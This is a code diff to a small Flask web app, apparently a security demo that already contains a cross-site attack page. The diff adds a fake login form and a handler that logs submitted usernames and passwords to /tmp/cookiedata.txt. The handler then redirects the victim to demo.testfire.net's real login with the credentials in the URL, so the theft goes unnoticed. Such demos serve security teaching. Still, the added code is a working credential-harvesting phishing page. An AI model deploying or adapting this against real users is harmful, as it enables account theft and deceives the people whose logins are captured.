@@ -1,6 +1,6 @@
 import os
 import sys
-from flask import Flask, request
+from flask import Flask, request, redirect
 from time import gmtime, strftime
 
 app=Flask(__name__)
@@ -64,6 +64,33 @@ def loanapproval():
 </html>
 '''
     return crosssite
+
+@app.route('/login')
+def login():
+    form_data='''<form id="foo" method="post" action="/handle_data">
+    Username : <input type="text" name='uid' value="admin">
+    Password : <input type="password" name='passw' value="">
+    <input type="submit" name="submit" value="Submit">
+    </form>
+    '''
+    return form_data
+
+
+    
+
+@app.route('/handle_data', methods=['POST'])
+def handle_data():
+    if request.method == 'POST':
+        req = request.form
+        uid = req.get('uid')
+        passw = req.get('passw')
+        data = 'uid:'+uid+'password:'+passw + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
+        file = open("/tmp/cookiedata.txt","a")
+        file.write(data)
+        file.close()
+        
+     
+    return redirect('http://demo.testfire.net/doLogin?uid='+uid+'&passw='+passw+'&btnSubmit=Login')
 
 
 if __name__=="__main__":
